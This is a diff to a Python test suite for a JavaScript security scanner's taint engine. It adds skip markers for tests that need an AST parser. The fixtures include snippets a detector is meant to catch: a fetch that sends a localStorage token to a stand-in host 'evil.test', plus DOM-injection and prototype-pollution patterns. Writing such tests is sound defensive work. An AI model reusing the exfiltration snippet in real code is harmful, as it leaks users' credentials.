@@ -10,6 +10,7 @@ These cover the accuracy work that is easy to regress silently:
   must still catch the canonical source-to-sink patterns.
 """
 
+import contextlib
 import os
 import sys
 import tempfile
@@ -26,9 +27,21 @@ from core.taint import analyze_taint
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
 from analyzers import api_analyzer, crypto_analyzer, dom_analyzer, flow_analyzer, secret_analyzer
+from core.js_parser import parser_available
 from core.risk_model import overall_risk
 from core.scanner import _credible_secret, scan_file
-from core.taint import analyze_taint
+
+# The taint engine has two honest modes: full AST tracking (esprima) and the
+# regex line-fallback, which is deliberately conservative about what it can
+# prove. The tests below split the same way: plain-method tests pin the
+# fallback, and the @requires_ast_parser ones pin precision only the AST
+# engine can deliver (member-chain sources, JSON.parse flows). Skipped --
+# not failed -- when the parser is absent, so "green" means the same thing
+# in every environment.
+requires_ast_parser = unittest.skipUnless(
+    parser_available(),
+    "needs the optional esprima AST parser (pip install esprima): pins AST-engine precision, not the fallback",
+)
 
 
 def scan(code):
@@ -38,10 +51,8 @@ def scan(code):
     try:
         return scan_file(path)
     finally:
-        try:
+        with contextlib.suppress(OSError):
             os.unlink(path)
-        except OSError:
-            pass
 
 
 def _flow_ids(code):
@@ -86,7 +97,6 @@ class RiskScoreTest(unittest.TestCase):
         self.assertEqual(result["label"], "LOW")
 
     def test_observations_are_capped_as_a_bucket(self):
-        few = overall_risk(findings=[_observation(i) for i in range(10)])
         many = overall_risk(findings=[_observation(i) for i in range(300)])
         self.assertLessEqual(many["score"], 20)
         self.assertLessEqual(many["counts"]["observation_points"],
@@ -320,6 +330,7 @@ class TaintPrecisionTest(unittest.TestCase):
         self.assertEqual(self._ids("const s = state.value; el.innerHTML = s;"), [])
         self.assertEqual(self._ids("const o = options.value; el.innerHTML = o;"), [])
 
+    @requires_ast_parser
     def test_real_form_value_reads_are_still_sources(self):
         self.assertIn("dom_injection", self._ids(
             "const v = document.querySelector('#x').value; el.innerHTML = v;"))
@@ -328,6 +339,7 @@ class TaintPrecisionTest(unittest.TestCase):
         self.assertIn("dom_injection", self._ids(
             "const v = e.target.value; el.innerHTML = v;"))
 
+    @requires_ast_parser
     def test_cookie_write_is_not_a_cookie_read(self):
         self.assertEqual(self._ids(
             "Cookies.set('theme', 'dark'); const t = Cookies.set('k','v'); el.innerHTML = t;"), [])
@@ -343,6 +355,7 @@ class TaintPrecisionTest(unittest.TestCase):
     def test_same_origin_query_reflection_is_not_exfiltration(self):
         self.assertEqual(self._ids("fetch('/api/search?q=' + location.search);"), [])
 
+    @requires_ast_parser
     def test_external_url_reflection_is_a_low_observation(self):
         flows = analyze_taint(
             "fetch('https://tracker.example/collect?q=' + location.search);", filename="t.js")
@@ -352,6 +365,7 @@ class TaintPrecisionTest(unittest.TestCase):
         self.assertEqual(f.get("severity"), "LOW")
         self.assertTrue(f.get("observation"))
 
+    @requires_ast_parser
     def test_sensitive_sources_to_network_are_still_high(self):
         flows = analyze_taint(
             "fetch('https://evil.test/c', {body: localStorage.getItem('token')});",
@@ -362,6 +376,7 @@ class TaintPrecisionTest(unittest.TestCase):
             for f in flows
         ))
 
+    @requires_ast_parser
     def test_json_parse_merge_is_prototype_pollution(self):
         ids = self._ids(
             "const q = new URLSearchParams(location.search).get('key');\n"
